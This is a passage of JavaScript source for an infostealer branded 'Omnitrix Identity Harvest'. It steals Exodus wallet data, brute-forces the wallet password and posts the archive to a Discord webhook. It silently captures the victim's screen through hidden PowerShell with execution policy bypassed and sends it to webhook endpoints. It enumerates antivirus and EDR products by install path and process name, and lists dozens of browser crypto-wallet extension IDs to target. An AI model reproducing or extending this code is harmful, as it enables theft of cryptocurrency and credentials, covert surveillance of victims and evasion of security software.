        const zipPath = path.join(os.tmpdir(), 'exodus_session.zip');
        zipDirectory(tempDir, zipPath);
        console.log('[EXODUS] Created ZIP');

        const content = fs.readFileSync(seed);

        const passwords = bruteForcePasswords();
        let found = null;
        let decrypted = null;

        for (let password of passwords) {
            decrypted = decryptSeco(content, password);
            if (decrypted) {
                found = password;
                console.log(`[EXODUS] Found password: '${password}'`);
                break;
            }
        }

        const link = await zipAndUpload(zipPath);

        if (link) {
            let fields = [
                {
                    name: '<:auth:1316345705341911063> How to Use:',
                    value: '>>> Download the file.\nNavigate to `%appdata%\\Exodus`.\nReplace the existing `exodus.wallet` folder with the one in the ZIP.\nOpen Exodus and try to access the wallet.',
                    inline: false
                }
            ];

            if (found !== null) {
                const pwdDisplay = found === '' ? 'No Password' : found;
                fields.push({
                    name: '🔑 Password Found:',
                    value: `> 🔑 **Password:** \`${pwdDisplay}\``,
                    inline: false
                });
            } else {
                fields.push({
                    name: '🔑 Password:',
                    value: '> ⚠️ **Password could not be found** (Wallet may be encrypted with custom password)',
                    inline: false
                });
            }

            const embed = {
                title: 'Omnitrix Identity Harvest: Exodus Wallet',
                color: BEN10_COLOR,
                description: `**🔍 Download:** [Encrypted Wallet Core](${link})`,
                fields: fields,
                footer: { text: BEN10_FOOTER_TEXT + ' | Asset Extracted', icon_url: BEN10_ICON },
                thumbnail: { url: 'https://cdn.discordapp.com/attachments/1433838501299753013/1439426256495055019/Z.png?ex=691a79aa&is=6919282a&hm=c8dee7c76f236023c6ede5a3e199e58a3f3b5251d09509abe828e8d132a97f8d&' },
                timestamp: new Date().toISOString()
            };

            const payload = {
                embeds: [embed]
            };

            await sendLog(payload);
            console.log('[EXODUS] Session sent to webhook');
        }

        fs.rmSync(tempDir, { recursive: true, force: true });
        fs.unlinkSync(zipPath);
    } catch (err) {
        console.log('[EXODUS] Error:', err.message);
    }
}

// ========================================
// SYSTEM COLLECTOR FUNCTIONS
// ========================================

function listBrowserFolders(deepFolder) {
    const wanted = ['output'];
    const found = [];

    const searchPaths = [
        deepFolder,
        process.cwd(),
        path.join(process.cwd(), 'output')
    ];

    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) {
            continue;
        }

        try {
            const entries = fs.readdirSync(searchPath, { withFileTypes: true });

            for (const e of entries) {
                if (!e.isDirectory()) continue;
                const n = e.name.toLowerCase();

                if (wanted.includes(n)) {
                    const fullPath = path.join(searchPath, e.name);
                    if (!found.includes(fullPath)) {
                        found.push(fullPath);
                    }
                }
            }
        } catch (e) {
        }
    }

    return found;
}

function detectAntivirus() {
    const detected = [];

    const avPaths = [
        'C:\\Program Files\\Avast Software',
        'C:\\Program Files\\McAfee',
        'C:\\Program Files\\Norton',
        'C:\\Program Files\\Kaspersky Lab',
        'C:\\Program Files\\BitDefender',
        'C:\\Program Files\\ESET',
        'C:\\Program Files\\AVG',
        'C:\\Program Files\\Malwarebytes',
        'C:\\Program Files\\Sophos',
        'C:\\Program Files (x86)\\Avast Software',
        'C:\\Program Files (x86)\\McAfee',
        'C:\\Program Files (x86)\\Norton',
        'C:\\Program Files (x86)\\Kaspersky Lab',
        'C:\\Program Files (x86)\\BitDefender',
        'C:\\Program Files (x86)\\ESET',
        'C:\\Program Files (x86)\\AVG',
        'C:\\Program Files (x86)\\Malwarebytes',
        'C:\\Program Files (x86)\\Sophos'
    ];

    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            detected.push(p);
        }
    }

    return detected;
}

async function detectAntivirusAsync() {
    const detected = [];

    const avPaths = [
        'C:\\Program Files\\Avast Software',
        'C:\\Program Files\\McAfee',
        'C:\\Program Files\\Norton',
        'C:\\Program Files\\Kaspersky Lab',
        'C:\\Program Files\\BitDefender',
        'C:\\Program Files\\ESET',
        'C:\\Program Files\\AVG',
        'C:\\Program Files\\Malwarebytes',
        'C:\\Program Files\\Sophos',
        'C:\\Program Files (x86)\\Avast Software',
        'C:\\Program Files (x86)\\McAfee',
        'C:\\Program Files (x86)\\Norton',
        'C:\\Program Files (x86)\\Kaspersky Lab',
        'C:\\Program Files (x86)\\BitDefender',
        'C:\\Program Files (x86)\\ESET',
        'C:\\Program Files (x86)\\AVG',
        'C:\\Program Files (x86)\\Malwarebytes',
        'C:\\Program Files (x86)\\Sophos'
    ];

    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            const avName = p.includes('Avast') ? 'Avast' :
                p.includes('McAfee') ? 'McAfee' :
                    p.includes('Norton') ? 'Norton' :
                        p.includes('Kaspersky') ? 'Kaspersky' :
                            p.includes('BitDefender') ? 'BitDefender' :
                                p.includes('ESET') ? 'ESET' :
                                    p.includes('AVG') ? 'AVG' :
                                        p.includes('Malwarebytes') ? 'Malwarebytes' :
                                            p.includes('Sophos') ? 'Sophos' : 'Unknown AV';
            detected.push(avName);
        }
    }

    const avList = [
        { name: 'Avast', processes: ['AvastSvc.exe', 'AvastUI.exe', 'avast.exe', 'aswEngSrv.exe', 'aswToolsSvc.exe'] },
        { name: 'McAfee', processes: ['McAfeeTray.exe', 'McAfeeUI.exe', 'mcafee.exe', 'mcshield.exe', 'mfeann.exe', 'mfemms.exe', 'mfetp.exe'] },
        { name: 'Norton', processes: ['NortonSecurity.exe', 'Norton.exe', 'norton.exe', 'ccSvcHst.exe', 'ccSvcHst.exe'] },
        { name: 'Kaspersky', processes: ['Kaspersky.exe', 'ksde.exe', 'kav.exe', 'avp.exe', 'klnagent.exe', 'kavfssvc.exe'] },
        { name: 'BitDefender', processes: ['BitDefender.exe', 'bdagent.exe', 'bdwtxag.exe', 'vsserv.exe', 'bdredline.exe'] },
        { name: 'Windows Defender', processes: ['MsMpEng.exe', 'SecurityHealthService.exe', 'MsSense.exe', 'SenseCncProxy.exe'] },
        { name: 'ESET', processes: ['ekrn.exe', 'egui.exe', 'esets_svc.exe', 'esets_gui.exe'] },
        { name: 'AVG', processes: ['AVG.exe', 'avgui.exe', 'avgsvc.exe', 'avgwdsvc.exe', 'avgidsagent.exe'] },
        { name: 'Malwarebytes', processes: ['MBAMService.exe', 'MBAMTray.exe', 'MBAMScheduler.exe', 'mbam.exe'] },
        { name: 'Sophos', processes: ['SophosUI.exe', 'SophosAV.exe', 'SophosED.exe', 'SophosFS.exe', 'SophosHealth.exe'] },
        { name: 'Trend Micro', processes: ['tmntsrv.exe', 'tmproxy.exe', 'tmlisten.exe', 'PccNTMon.exe', 'Ntrtscan.exe'] },
        { name: 'Panda', processes: ['PSUAService.exe', 'PavFnSvr.exe', 'PavPrSrv.exe', 'Panda_URL_Filtering.exe'] },
        { name: 'Avira', processes: ['avguard.exe', 'avgnt.exe', 'avshadow.exe', 'Avira.ServiceHost.exe'] },
        { name: 'Comodo', processes: ['cmdagent.exe', 'cis.exe', 'CisTray.exe', 'cfp.exe'] },
        { name: 'F-Secure', processes: ['fsaua.exe', 'fsav.exe', 'fshoster32.exe', 'fsorsp.exe'] },
        { name: 'ZoneAlarm', processes: ['zlclient.exe', 'vsmon.exe', 'ZoneAlarm.exe'] },
        { name: 'Webroot', processes: ['WRSA.exe', 'WRSVC.exe', 'WRCoreService.exe'] },
        { name: 'BullGuard', processes: ['BullGuardAV.exe', 'BullGuardTray.exe', 'BullGuardScanner.exe'] },
        { name: 'VIPRE', processes: ['SBAMSvc.exe', 'VIPREUI.exe', 'SBAMTray.exe'] },
        { name: 'G Data', processes: ['AVK.exe', 'GDScan.exe', 'AVKTray.exe'] },
        { name: 'Emsisoft', processes: ['a2service.exe', 'a2guard.exe', 'a2start.exe'] },
        { name: 'IObit', processes: ['IMFsrv.exe', 'ASC.exe', 'HipsDaemon.exe'] },
        { name: '360 Total Security', processes: ['360Tray.exe', '360sd.exe', '360rp.exe', 'ZhuDongFangYu.exe'] },
        { name: 'Qihoo 360', processes: ['360Safe.exe', 'ZhuDongFangYu.exe', '360Tray.exe'] },
        { name: 'Tencent', processes: ['QQPCMgr.exe', 'QQPCTray.exe', 'QQPCRTP.exe'] },
        { name: 'Baidu', processes: ['BaiduSdSvc.exe', 'BaiduSdTray.exe', 'BaiduSd.exe'] },
        { name: 'Rising', processes: ['RsMgrSvc.exe', 'RsTray.exe', 'Rising.exe'] },
        { name: 'Kingsoft', processes: ['KAVStart.exe', 'KSWebShield.exe', 'kwsprotect64.exe'] },
        { name: 'Jiangmin', processes: ['KVMonXP.exe', 'KVXP.exe', 'KVFW.exe'] },
        { name: 'Dr.Web', processes: ['dwengine.exe', 'dwarkdaemon.exe', 'dwscanner.exe'] },
        { name: 'Bkav', processes: ['BkavService.exe', 'BkavTray.exe', 'BkavPro.exe'] },
        { name: 'ClamAV', processes: ['clamd.exe', 'freshclam.exe', 'clamscan.exe'] },
        { name: 'Fortinet', processes: ['FortiTray.exe', 'FortiClient.exe', 'FortiESNAC.exe'] },
        { name: 'Check Point', processes: ['cpda.exe', 'cpep.exe', 'cpoca.exe'] },
        { name: 'Cisco', processes: ['csc.exe', 'csagent.exe', 'ciscoamp.exe'] },
        { name: 'Symantec', processes: ['smc.exe', 'smcgui.exe', 'rtvscan.exe', 'ccSvcHst.exe'] },
        { name: 'CrowdStrike', processes: ['CSFalconService.exe', 'CSFalcon.exe', 'CSFalconContainer.exe'] },
        { name: 'SentinelOne', processes: ['SentinelAgent.exe', 'SentinelUI.exe', 'SentinelServiceHost.exe'] },
        { name: 'Carbon Black', processes: ['cb.exe', 'cbcomms.exe', 'RepMgr.exe', 'RepUtils.exe'] },
        { name: 'Cylance', processes: ['CylanceSvc.exe', 'CylanceUI.exe', 'CylancePROTECT.exe'] },
        { name: 'Darktrace', processes: ['dtagent.exe', 'dtui.exe', 'DarktraceSvc.exe'] },
        { name: 'FireEye', processes: ['xagt.exe', 'xagtnotif.exe', 'xagtnotif.exe'] },
        { name: 'Palo Alto', processes: ['PanGPS.exe', 'PanGPA.exe', 'PanMS.exe'] },
        { name: 'Proofpoint', processes: ['PPSX.exe', 'PPActiveDetection.exe', 'ProofpointTAP.exe'] },
        { name: 'Zscaler', processes: ['ZSATray.exe', 'ZSAgent.exe', 'Zscaler.exe'] },
        { name: 'Forcepoint', processes: ['fpavserver.exe', 'fpclient.exe', 'Forcepoint.exe'] },
        { name: 'Blue Coat', processes: ['bcs.exe', 'bcsservice.exe', 'BlueCoat.exe'] },
        { name: 'Websense', processes: ['websense.exe', 'wepsvc.exe', 'WebsenseControl.exe'] },
        { name: 'NetWitness', processes: ['nwsvc.exe', 'nwui.exe', 'NetWitness.exe'] },
        { name: 'RSA', processes: ['rsa.exe', 'rsaservice.exe', 'RSAArcher.exe'] },
        { name: 'Ad-Aware', processes: ['AdAwareService.exe', 'AdAwareTray.exe', 'AdAware.exe'] },
        { name: 'AhnLab', processes: ['V3Svc.exe', 'V3UI.exe', 'V3Medic.exe'] },
        { name: 'Arcabit', processes: ['Arcabit.exe', 'ArcaAV.exe', 'ArcabitSvc.exe'] },
        { name: 'Authentium', processes: ['Authentium.exe', 'CommandAntivirus.exe', 'AuthentiumSvc.exe'] },
        { name: 'Cat Quick Heal', processes: ['qhwatchdog.exe', 'qhconsol.exe', 'QUHLPSVC.EXE'] },
        { name: 'CMC', processes: ['CMC.exe', 'CMCSvc.exe', 'CMCAgent.exe'] },
        { name: 'eSafe', processes: ['eSafe.exe', 'eSafeSvc.exe', 'eSafeAgent.exe'] },
        { name: 'eTrust', processes: ['VetMsg.exe', 'VetTray.exe', 'eTrust.exe'] },
        { name: 'F-Prot', processes: ['FProtTray.exe', 'FProtSvc.exe', 'FProt.exe'] },
        { name: 'Grisoft', processes: ['avgcc.exe', 'avgw.exe', 'Grisoft.exe'] },
        { name: 'Hacksoft', processes: ['Hacksoft.exe', 'HacksoftSvc.exe', 'HacksoftAgent.exe'] },
        { name: 'Hauri', processes: ['Hauri.exe', 'HauriSvc.exe', 'HauriAgent.exe'] },
        { name: 'IKARUS', processes: ['IKARUS.exe', 'IKARUSSvc.exe', 'IKARUSAgent.exe'] },
        { name: 'Jetico', processes: ['Jetico.exe', 'JeticoSvc.exe', 'JeticoAgent.exe'] },
        { name: 'K7 Computing', processes: ['K7TSecurity.exe', 'K7TSMain.exe', 'K7TSAgent.exe'] },
        { name: 'Norman', processes: ['Norman.exe', 'NormanSvc.exe', 'NormanAgent.exe'] },
        { name: 'PC Tools', processes: ['PCTools.exe', 'PCToolsSvc.exe', 'PCToolsAgent.exe'] },
        { name: 'Prevx', processes: ['Prevx.exe', 'PrevxSvc.exe', 'PrevxAgent.exe'] },
        { name: 'Secure Computing', processes: ['SecureComputing.exe', 'SecureComputingSvc.exe', 'SecureComputingAgent.exe'] },
        { name: 'SecureWave', processes: ['SecureWave.exe', 'SecureWaveSvc.exe', 'SecureWaveAgent.exe'] },
        { name: 'Sunbelt', processes: ['Sunbelt.exe', 'SunbeltSvc.exe', 'SunbeltAgent.exe'] },
        { name: 'The Hacker', processes: ['TheHacker.exe', 'TheHackerSvc.exe', 'TheHackerAgent.exe'] },
        { name: 'UNA', processes: ['UNA.exe', 'UNASvc.exe', 'UNAAgent.exe'] },
        { name: 'VirusBuster', processes: ['VirusBuster.exe', 'VirusBusterSvc.exe', 'VirusBusterAgent.exe'] }
    ];

    try {
        const { stdout } = await execAsync('tasklist /FO CSV /NH');
        const lines = stdout.split('\n');
        const runningProcesses = new Set();
        for (const line of lines) {
            const parts = line.split(',');
            if (parts.length > 0) {
                const imageName = parts[0].replace(/"/g, '');
                runningProcesses.add(imageName.toLowerCase());
            }
        }

        for (const av of avList) {
            for (const proc of av.processes) {
                if (runningProcesses.has(proc.toLowerCase())) {
                    detected.push(av.name);
                    break;
                }
            }
        }
    } catch (e) {
        // ignore
    }

    return [...new Set(detected)];
}

async function sendScreenshotToWebhook() {
    try {
        const psCommand = `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $memoryStream = New-Object System.IO.MemoryStream; $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png); $bytes = $memoryStream.ToArray(); [System.Console]::OpenStandardOutput().Write($bytes, 0, $bytes.Length); $bitmap.Dispose(); $graphics.Dispose(); $memoryStream.Dispose();`;

        const img = execSync(`powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "${psCommand}"`, { encoding: null, maxBuffer: 10 * 1024 * 1024 });

        const targets = [CONFIG.webhook, CONFIG.dualhook].filter(h => h && h.startsWith('https://'));

        const embed = {
            title: 'Victim Screenshot',
            color: BEN10_COLOR,
            image: {
                url: 'attachment://screenshot.png'
            },
            footer: {
                text: BEN10_FOOTER_TEXT,
                icon_url: BEN10_ICON
            },
            timestamp: new Date().toISOString()
        };

        for (const url of targets) {
            try {
                const form = new FormData();
                form.append('payload_json', JSON.stringify({
                    embeds: [embed]
                }));

                form.append('file', img, {
                    filename: 'screenshot.png',
                    contentType: 'image/png'
                });

                await axios.post(url, form, {
                    headers: form.getHeaders(),
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                    timeout: 45000
                });
            } catch (e) { }
        }
    } catch (error) { }
}


// ========================================
// WALLET EXTRACTION FUNCTIONS
// ========================================

const browserWalletPaths = {
    Chrome: {
        base: path.join(localappdata, 'Google', 'Chrome', 'User Data'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Binance Wallet': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'Exodus': 'aholpfdialjgjfhomihkjbmgjidlcdno',
            'Atomic Wallet': 'fhilaheimglignddkjgofkcbgekhenbh',
            'Math Wallet': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
            'BitKeep': 'jiidiaalihmmhddjgbnbgdfflelocpak',
            'OKX Wallet': 'mcohilncbfahbmgdjkbpemcciiolgcge',
            'Rabby Wallet': 'acmacodkjbdgmoleebolmdjonilkdbch',
            'XDEFI Wallet': 'hmeobnfnfcmdkdcmlblgagmfpfboieaf',
            'SafePal': 'lgmpcpglpngdoalbgeoldeajfclnhafa',
            'Keplr': 'dmkamcknogkgcdfhhbddcghachkejeap',
            'Terra Station': 'aiifbnbfobpmeekipheeijimdpnlpgpp',
            'Nami': 'lpfcbjknijpeeillifnkikgncikgfhdo',
            'Eternl': 'kmhcihpebfmpgmihbkipmjlmmioameka',
            'Yoroi': 'ffnbelfdoeiohenkjibnmadjiehjhajb',
            'TronLink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
            'Ronin Wallet': 'fnjhmkhhmkbjkkabndcnnogagogbneec',
            'Liquality': 'kpfopkelmapcoipemfendmdcghnegimn',
            'Solflare': 'bhhhlbepdkbapadjdnnojkbgioiodbic',
            'Slope': 'pocmplpaccanhmnllbbkpgfliimjljgo',
            'Braavos': 'jnlgamecbpmbajjfhmmmlhejkemejdma',
            'Polymesh': 'jojhfeoedkpkglbfimdfabpdfjaoolaf',
            'ICONex': 'flpiciilemghbmfalicajoolhkkenfel',
            'Nabox': 'nknhiehlklippafakaeklbeglecifhad',
            'KardiaChain': 'pdadjkfkgcafgbceimcpbkalnfnepbnk',
            'Wombat': 'amkmjjmmflddogmhpjloimipbofnfjih',
            'MEW CX': 'nlbmnnijcnlegkjjpcfjclmcfggfefdm',
            'Guarda': 'hpglfhgfnhbgpjdenjgmdgoeiappafln',
            'EVER Wallet': 'cgeeodpfagjceefieflmdfphplkenlfk',
            'Clover': 'nhnkbkgjikgcigadomkphalanndcapjk',
            'Leather (Hiro)': 'ldinpeekobnhjjdofggfgjlcehhmanlj',
            'Sui Wallet': 'opcgpfmipidbgpenhmajoajpbobppdil',
            'Petra Aptos': 'ejjladinnckdgjemekebdpeokbikhfci',
            'Martian Aptos': 'efbglgofoippbgcjepnhiblaibcnclgk',
            'Pontem Aptos': 'phkbamefinggmakgklpkljjmgibohnba',
            'Sender Wallet': 'epapihdplajcdnnkdeiahlgigofloibg',
            'Goby': 'jnkelfanjkeadonecabehalmbgpfodjm',
            'Leap Cosmos': 'fcfcfllfndlomdhbehjjcoimbgofdncg',
            'Core': 'agoakfejjabomempkjlepdflaleeobhb',
            'Harmony': 'fnnegphlobjdpkhecapkijjdkgcjhkib',
            'Enkrypt': 'kkpllkodjeloidieedojogacfhpaihoh',
            'Opera Wallet': 'nkddgncdjgjfcddamfgcmfnlhccnimig',
            'Rainbow': 'opfgelmcmbiajamepnmloijbpoleiama',
            'Zerion': 'klghhnkeealcohjjanjjdaeeggmfmlpl',
            'Talisman': 'fijngjgcjhjmmpcmkeiomlglpeiijkld',
            'Backpack': 'aflkmfhebedbjioipglgcbcmnbpgliof',
            'Fordefi': 'gnagcihlkglhdgaadhekmihmlnomkdei',
            'SubWallet': 'onhogfjeacnfoofkfgppdlbmlmnplgbn',
            'PolkadotJS': 'mopnmbcafieddcagagdcbnhejhlodfdd',
            'Compass': 'anokgmphncpekkhclmingpimjmcooifb',
            'OWallet': 'hhejbopdnpbjgomhpmegemnjdwerdhhl',
            'Cosmostation': 'fpkhgmpbidmiogeglndfbkegfdlnajnf',
            'Frontier': 'kppfdiipphfccemcignhifpjkapfbihd',
            'Bifrost': 'gfbapjadghcjbjbimlgpnkjomgkkidlg',
            'Frame': 'ldcoohedfbjoobcadoglnnmmfbdlmmhf',
            'Noone': 'mjhibnmklpkhdfmhpgmihcikaclklkdb',
            'Temple': 'ookjlbkiijinhpmnjffcofjonbfbgaoc',
            'Beacon': 'gpfndedineagiepkpinficbcbbgjoenn',
            'Kukai': 'dhoiejdeibakejckcmgdcbakjdjoklco',
            'Spire': 'gpaigehiakghopkbbgpolppmojpckklm',
            'Umami': 'bkdaaifcdibjmbknjcmbagpepkbhfjhg',
            'Cyano': 'dkdedlpgdmmkkfjabffeganieamfklkm',
            'OneKey': 'jnmbobjmhlngoefaiojfljckilhhlhcj',
            'Safepal Extension': 'lgmpcpglpngdoalbgeoldeajfclnhafa',
            'Slope Finance': 'pocmplpaccanhmnllbbkpgfliimjljgo',
            'Coin98': 'aeachknmefphepccionboohckonoeemg',
            'TokenPocket': 'mfgccjchihfkkindfppnaooecgfneiii',
            'ioPay': 'ilgbfbicnkangdlofblackcoignjacni',
            'Auro': 'cnmamaachppnkjgnildpdlbmlmnplgbn',
            'Leafkey': 'bhmejakjdfmhfobdamfbpeocicjdajij',
            'OneKey (Legacy)': 'infeboajgfhgbjpjbeppbkgnabfdkdaf',
            'Nifty': 'jbdaocneiiinmjbjlgalhcelgbejmnid',
            'BoltX': 'aodkkagnadcbobfpggfnjeongemjbjca',
            'Liquality Wallet': 'kpfopkelmapcoipemfendmdcghnegimn',
            'Saturn': 'nkddgncdjgjfcddamfgcmfnlhccnimig',
            'Guild': 'nanjmdknhkinifnkgdcggcfnhdaammmj',
            'Taho (Tally Ho)': 'eajafomhmkipbjmfmhebemolkcicgfmd',
            'Xverse': 'idnnbdplmphpflfnlkomgpfbpcgelopg',
            'DeFi Wallet': 'klhkobkdpphfpioepbgjhdeomkdafgme',
            'Avail': 'kkpllkodjeloidieedojogacfhpaihoh',
            'MewCx': 'nlbmnnijcnlegkjjpcfjclmcfggfefdm',
            'Casper Signer': 'djhndpllfiibmcdbnmaaahkhchcoijce',
            'Subwallet Polkadot': 'onhogfjeacnfoofkfgppdlbmlmnplgbn',
            'Finnie': 'cjmkndjhnagcfbpiemnkdpomccnjblmj',
            'Stargazer': 'pgiaagfkgcbnmiiolekcfmljdagdhlcm',
            'Polymesh Wallet': 'jojhfeoedkpkglbfimdfabpdfjaoolaf',
            'Martian Wallet': 'efbglgofoippbgcjepnhiblaibcnclgk',
            'Maiar DeFi': 'dngmlblcodfobpdpecaadgfbcggfjfnm',
            'Flint Wallet': 'hnhobjmcibchnmglfbldbfabcgaknlkj',
            'Sender': 'epapihdplajcdnnkdeiahlgigofloibg',
            'Brave Wallet': 'odbfpeeihdkbihmopkbjmoonfanlbfcl'
        }
    },
    Edge: {
        base: path.join(localappdata, 'Microsoft', 'Edge', 'User Data'),
        wallets: {
            'MetaMask': 'ejbalbakoplchlghecdalmeeeajnimhm',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Binance Wallet': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph'
        }
    },
    Brave: {
        base: path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad'
        }
    },
    Opera: {
        base: path.join(appData, 'Opera Software', 'Opera Stable'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
        }

==================================================
